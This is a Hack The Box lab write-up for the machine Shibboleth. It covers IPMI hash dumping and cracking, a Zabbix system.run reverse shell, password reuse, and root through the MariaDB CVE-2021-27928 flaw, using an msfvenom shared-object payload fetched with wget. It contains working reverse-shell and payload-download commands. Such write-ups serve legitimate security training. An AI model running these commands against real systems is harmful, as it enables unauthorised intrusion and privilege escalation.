---
title : "Hack The Box - Shibboleth"
author: Bhaskar Pal
date: 2022-04-05 11:17:00 +0800
categories: [Hackthebox, Hackthebox-Linux, Hackthebox-Medium]
tags: [network,MariaDB,password-reuse,Internal,IPMI,CVE-Exploitation,CVE-2021-27928,Weak-Credentials]
---

![image](https://user-images.githubusercontent.com/59029171/161530966-daeb8423-af16-4b35-969a-92301924c330.png)

**Shibboleth is about enumerating the UDP ports through which we can find IPMI service is running. We can dump the administrator hashes and log in to one of Shibboleth's subdomains, where we can get RCE and an initial shell as Zabbix. With password reuse, we can move laterally to ipmi-svc. To root the box, it's a simple RCE on an outdated version of MySQL.**

---

# <span style="color:lightblue">Recon</span>
## <span style="color:lightgreen">Nmap</span>

The first thing that I do is run nmap scan enumerating tcp and udp that show this results:

```console
0xStarlight@kali$ nmap -sC -sV -Pn 10.10.11.124 -vv > nmap_tcp_scan.conf
0xStarlight@kali$ nmap -sC -sV -sU -Pn 10.10.11.124 -vv > nmap_udp_scan.conf
0xStarlight@kali$ cat nmap_tcp_scan.conf nmap_udp_scan.conf

[SNIP...]
PORT   STATE SERVICE    REASON  VERSION
80/tcp open  tcpwrapped syn-ack
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://shibboleth.htb/
|
PORT    STATE SERVICE  VERSION
623/udp open  asf-rmcp
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port623-UDP:V=7.91%I=7%D=1/15%Time=61E2A6CF%P=x86_64-pc-linux-gnu%r(ipm
SF:i-rmcp,1E,"\x06\0\xff\x07\0\0\0\0\0\0\0\0\0\x10\x81\x1cc\x20\x008\0\x01
SF:\x97\x04\x03\0\0\0\0\t");
```

From the Nmap results, we can see that there is port 80, which is a web service apache 2.4.41, is running on the server with a hostname of `shibboleth.htb`. So we can add it to our `/etc/hosts` file.

On port 623, we can see the asf-rmcp service running. UDP IPMI service on port 623 is a quick way of discovering BMCs on the network. 

## <span style="color:lightgreen">shibboleth.htb - TCP 80</span>

Upon visiting the site, it seems to be made out of bootstrap. It has a few pages visible on the top. There is also a contact form which returns an error when submitted.

![image](https://user-images.githubusercontent.com/59029171/161533352-6cf65210-7241-4bd6-8441-0fcd226151a0.png)

I tried feroxbuster, but no interesting page was returned to me. At the bottom of the page, we can view how the server is hosted. 

*Powered by enterprise monitoring solutions based on Zabbix and Bare Metal BMC automation.*

Doing a lot of research on Bare Metal BMC displays many references about IPMI.

![image](https://user-images.githubusercontent.com/59029171/161536444-7a32c197-ca8d-4ad5-a65b-8ab94a351ed2.png)


## <span style="color:lightgreen">Subdomain Fuzzing</span>

The next thing I tried was subdomain fuzzing using `ffuf`. I'll start the scan and immediately kill it, then use the `-fw` tag to hide all the pages redirecting me to status 302 with word 18.

```console
0xStarlight@kali$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://shibboleth.htb/ -H "Host: FUZZ.shibboleth.htb" -fw 18                        

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://shibboleth.htb/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.shibboleth.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response words: 18
________________________________________________

monitor                 [Status: 200, Size: 3684, Words: 192, Lines: 30]
monitoring              [Status: 200, Size: 3684, Words: 192, Lines: 30]
zabbix                  [Status: 200, Size: 3684, Words: 192, Lines: 30]
```

I’ll add each of those to `/etc/hosts` as well:
```console
10.10.11.124 shibboleth.htb monitor.shibboleth.htb monitoring.shibboleth.htb zabbix.shibboleth.htb
```
## <span style="color:lightgreen">monitor.shibboleth.htb - TCP 80</span>

We can see ZABBIX is running on this subdomain upon visiting the site. At the bottom, we can see the copyright till 2021. So this means we could be an outdated service abuse. Since we saw from `shibboleth.htb` is powered by Bare Metal BMC automation, there could be a chance that we could abuse IMPI to get a valid login credential to log in.

![image](https://user-images.githubusercontent.com/59029171/161535439-83b7e2c0-611c-42e1-8c30-01bd6e6ac912.png)

## <span style="color:lightgreen">IMPI - UDP 623</span>

One of the [blogs](http://www.staroceans.org/e-book/IPMI-hack.htm), I read while researching stated that *Most BMCs expose some form of web-based management, a command-line interface such as Telnet or Secure Shell, and the IPMI network protocol on port 623 (UDP and sometimes TCP).*

The article on [Hacktricks](https://book.hacktricks.xyz/pentesting/623-udp-ipmi) demonstrated the exploitation of IMPI and dumping of the users hashes.

Basically, you can ask the server for the hashes MD5 and SHA1 of any username and if the username exists those hashes will be sent back. Yeah, as amazing as it sounds. And there is a metasploit module for testing this.

```console
msf > use auxiliary/scanner/ipmi/ipmi_dumphashes
msf > set rhosts 10.10.11.124
msf > exploit

[+] 10.10.11.124:623 - IPMI - Hash found: Administrator:2b68c64d82280000a8c1a7e2d84aba3e0410df33d1bf8d7f39a69fefdb2a49b26877364dbe132618a123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:b2726f78047e0ccb5324cb8a4701686d29ad00a5
```

Now we have the administrators hash. we can crack the hash using hashcat and try to login using the found credentials.

```console
0xStarlight@kali$ hashcat -m 7300 hash /home/kali/rockyou.txt

password : ilovepumkinpie1
```

# <span style="color:lightblue">Shell as Zabbix</span>

Great, now we have Administrator user valid credentials.

| Useraname | Password |
|:---       | :---     |
| Administrator | ilovepumkinpie1 |

We can go back to `monitor.shibboleth.htb` and log in as Administrator.


![image](https://user-images.githubusercontent.com/59029171/161680107-abf2c7d5-b3dd-4dc2-953a-f955394ca908.png)

The end of the dashboard page displays the version of Zabbix, i.e.,  Zabbix 5.0.17. © 2001–2021, Zabbix SIA. I tried to google if there were any documents or any pre available exploits for the version Zabbix is running on.

After a lot of digging, I couldn't find any pre available exploits for abusing Zabbix 5.0.17. Still, on reading the [documentation](https://www.zabbix.com/documentation/current/en/manual/config/items/itemtypes/zabbix_agent) of the Zabbix agent, the system data command mentioned that it was possible for command execution using the `system.run[command,<mode>]` function.

![image](https://user-images.githubusercontent.com/59029171/161682238-2d6c404e-b589-4aae-bbd4-031379d77361.png)

Let's try it out. First, set a listener on our machine.
```console
0xStarlight@kali$ sudo rlwrap nc -lnvp 8888
```

Navigate to the following --> Configurations > Host > Items > create item

We can inject our payload for a reverse shell into the *key value* and then test the value to execute the command.

```bash
system.run[/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.x.x/8888 0>&1",nowait]
```

![image](https://user-images.githubusercontent.com/59029171/161682689-f6932519-3397-414a-8e62-55bcf575b02f.png)

# <span style="color:lightblue">Shell as ipmi-svc</span>

After receiving a reverse shell from Zabbix, we can make it into a stable shell to work on it more efficiently.

```console
zabbix@shibboleth:/$ python3 -c "import pty;pty.spawn('/bin/bash')"
```

I identified another user on the machine, `ipmi-svc`. Since we already have a credential found, we can try to use that to elevate to that user.

```console
zabbix@shibboleth:/$ su ipmi-svc
password : ilovepumkinpie1

ipmi-svc@shibboleth:/$ whoami;id
ipmi-svc
uid=1000(ipmi-svc) gid=1000(ipmi-svc) groups=1000(ipmi-svc)
```

## <span style="color:lightgreen">Enumeration</span>

The first thing I checked was Zabbix config file stored as `/etc/zabbix/`  to check if there would be any other user's credentials hardcoded into it, which we may use for privilege escalation.

```console
ipmi-svc@shibboleth:/$ grep -iR 'password' /etc/zabbix/ 2>/dev/null
```
![image](https://user-images.githubusercontent.com/59029171/161683794-d727abb8-fc5a-4f23-86ab-be025cbbfda0.png)

Further reading the file, we can find the username and the password to access Zabbix's database server.

| Useraname | DBUser | DBPassword |
|:---       | :---     | :--      |
| zabbix | zabbix | bloooarskybluh |

I also ran linpeas on another shell to check if it returned anything interesting. It displayed MySQL is running on the machine on port 3306.

![image](https://user-images.githubusercontent.com/59029171/161684262-238df92d-e8f2-4f3d-ba0a-67db3c2a24b5.png)

# <span style="color:lightblue">Shell as Root</span>

We can log in to the MYSQL databases server with the above credential.  

```console
ipmi-svc@shibboleth:/$ mysql -u zabbix -p -D zabbix
password : bloooarskybluh

Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 17592
Server version: 10.3.25-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [zabbix]> 
```

On reading the server version, it's currently running on MariaDB 10.3.25, an older version of MariaDB. Doing a quick google search, I found out it was vulnerable to remote code execution, which would give us privileged access as root user using [CVE-2021-27928](https://packetstormsecurity.com/files/162177/MariaDB-10.2-Command-Execution.html).

Using the CVE we can craft our payload and get root access.

## <span style="color:lightgreen">Local Machine</span>

Create the reverse shell payload and start the listener.
```console
0xStarlight@kali$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.x.x LPORT=9999 -f elf-so -o shell.so
0xStarlight@kali$ sudo rlwrap nc -lnvp 9999
```

We can start a python server so we can transfer the file on ipmi-svc using wget. 
```console
0xStarlight@kali$ python3 -m http.server 80
```

## <span style="color:lightgreen">ipmi-svc Machine</span>

Transfer the file, execute the payload and check on the listening listener to get a shell as root.
```console
ipmi-svc@shibboleth:/$ wget http://10.10.x.x/shell.so -o /tmp/shell.so
ipmi-svc@shibboleth:/$ mysql -u zabbix -p -D zabbix -e 'SET GLOBAL wsrep_provider="/tmp/shell.so";'
password : bloooarskybluh
```

![image](https://user-images.githubusercontent.com/59029171/161686612-2a4d8f9f-2ea2-4711-ada7-538281026b4c.png)

# <span style="color:lightblue">Box Rooted</span>

![image](https://user-images.githubusercontent.com/59029171/161686774-cd12e45c-5bc3-4bc2-8c3d-b253dd05752f.png)

HTB Profile : [0xStarlight](https://app.hackthebox.com/profile/244565)

If you find my articles interesting, you can buy me a coffee 

<a href="https://www.buymeacoffee.com/0xStarlight"><img src="https://img.buymeacoffee.com/button-api/?text=Buy me an OSCP?&emoji=&slug=0xStarlight&button_colour=b86e19&font_colour=ffffff&font_family=Poppins&outline_colour=ffffff&coffee_colour=FFDD00" /></a>
